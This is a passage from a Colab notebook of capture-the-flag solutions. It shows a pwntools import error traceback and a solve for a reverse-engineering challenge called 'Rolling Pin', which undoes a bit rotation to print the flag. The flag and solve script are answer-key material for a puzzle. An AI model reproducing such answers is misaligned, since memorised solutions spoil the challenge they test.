            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/__init__.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      4\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 6\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mcompleter\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      7\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mkey\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      8\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mkeymap\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/completer.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m      5\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mre\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      6\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m----> 7\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mreadline\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m      8\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m      9\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/readline.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m     12\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mkeymap\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0mkm\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     13\u001b[0m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mterm\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 14\u001b[0;31m \u001b[0;32mfrom\u001b[0m \u001b[0mpwnlib\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mterm\u001b[0m \u001b[0;32mimport\u001b[0m \u001b[0mtext\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     15\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     16\u001b[0m \u001b[0mcursor\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtext\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mreverse\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/text.py\u001b[0m in \u001b[0;36m<module>\u001b[0;34m\u001b[0m\n\u001b[1;32m    134\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    135\u001b[0m \u001b[0mtether\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmodules\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0m__name__\u001b[0m\u001b[0;34m]\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 136\u001b[0;31m \u001b[0msys\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mmodules\u001b[0m\u001b[0;34m[\u001b[0m\u001b[0m__name__\u001b[0m\u001b[0;34m]\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mModule\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/text.py\u001b[0m in \u001b[0;36m__init__\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m     40\u001b[0m             \u001b[0;34m'white'\u001b[0m\u001b[0;34m:\u001b[0m \u001b[0;36m7\u001b[0m\u001b[0;34m,\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     41\u001b[0m             }\n\u001b[0;32m---> 42\u001b[0;31m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_reset\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mtermcap\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mget\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m'reset'\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     43\u001b[0m         \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_attributes\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0;34m{\u001b[0m\u001b[0;34m}\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     44\u001b[0m         for x, y in [('italic'   , 'sitm'),\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/unix_termcap.py\u001b[0m in \u001b[0;36mget\u001b[0;34m(cap, *args, **kwargs)\u001b[0m\n\u001b[1;32m     23\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     24\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0mcache\u001b[0m \u001b[0;32mis\u001b[0m \u001b[0;32mNone\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 25\u001b[0;31m         \u001b[0minit\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     26\u001b[0m     \u001b[0ms\u001b[0m \u001b[0;34m=\u001b[0m \u001b[0mcache\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mget\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mcap\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     27\u001b[0m     \u001b[0;32mif\u001b[0m \u001b[0;32mnot\u001b[0m \u001b[0ms\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/pwnlib/term/unix_termcap.py\u001b[0m in \u001b[0;36minit\u001b[0;34m()\u001b[0m\n\u001b[1;32m     57\u001b[0m         \u001b[0;31m# Fix for BPython\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     58\u001b[0m         \u001b[0;32mtry\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m---> 59\u001b[0;31m             \u001b[0mcurses\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0msetupterm\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m     60\u001b[0m         \u001b[0;32mexcept\u001b[0m \u001b[0mcurses\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0merror\u001b[0m \u001b[0;32mas\u001b[0m \u001b[0me\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m     61\u001b[0m             \u001b[0;32mimport\u001b[0m \u001b[0mtraceback\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;32m/usr/local/lib/python3.12/dist-packages/ipykernel/iostream.py\u001b[0m in \u001b[0;36mfileno\u001b[0;34m(self)\u001b[0m\n\u001b[1;32m    309\u001b[0m             \u001b[0;32mreturn\u001b[0m \u001b[0mself\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0m_original_stdstream_copy\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    310\u001b[0m         \u001b[0;32melse\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0;32m--> 311\u001b[0;31m             \u001b[0;32mraise\u001b[0m \u001b[0mio\u001b[0m\u001b[0;34m.\u001b[0m\u001b[0mUnsupportedOperation\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0;34m\"fileno\"\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n\u001b[0m\u001b[1;32m    312\u001b[0m \u001b[0;34m\u001b[0m\u001b[0m\n\u001b[1;32m    313\u001b[0m     \u001b[0;32mdef\u001b[0m \u001b[0m_watch_pipe_fd\u001b[0m\u001b[0;34m(\u001b[0m\u001b[0mself\u001b[0m\u001b[0;34m)\u001b[0m\u001b[0;34m:\u001b[0m\u001b[0;34m\u001b[0m\u001b[0;34m\u001b[0m\u001b[0m\n",
            "\u001b[0;31mUnsupportedOperation\u001b[0m: fileno"
          ]
        }
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "# **Rolling Pin**: Rev"
      ],
      "metadata": {
        "id": "Wje38g0ThNod"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "baked = [0x62, 0xE4, 0xD5, 0x73, 0xE6, 0xAC, 0x9C, 0xBD, 0x72, 0x60, 0xD1, 0xA1, 0x47, 0x66, 0xD7, 0x3A, 0x68, 0x66, 0x7D, 0x23, 0x03, 0xAE, 0xD9, 0x34, 0x7D]\n",
        "\n",
        "def rotr(y, k):\n",
        "    k = k & 7\n",
        "    return ((y >> k) | (y << (8 - k))) & 0xFF\n",
        "\n",
        "input_str = ''\n",
        "for i in range(25):\n",
        "    k = i & 7\n",
        "    char = rotr(baked[i], k)\n",
        "    input_str += chr(char)\n",
        "    if not (32 <= char <= 126):\n",
        "        print(f\"Warning: input[{i}] = {chr(char)} (0x{char:02x}) is not printable\")\n",
        "\n",
        "print(\"Input string:\", input_str)"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "86csJV-0gKLm",
        "outputId": "e51a5fba-3fda-4caa-b3fe-28d76ccfa0ef"
      },
      "execution_count": null,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Input string: brunner{r0t4t3_th3_d0ugh}\n"
          ]
        }
      ]
    }
  ]
}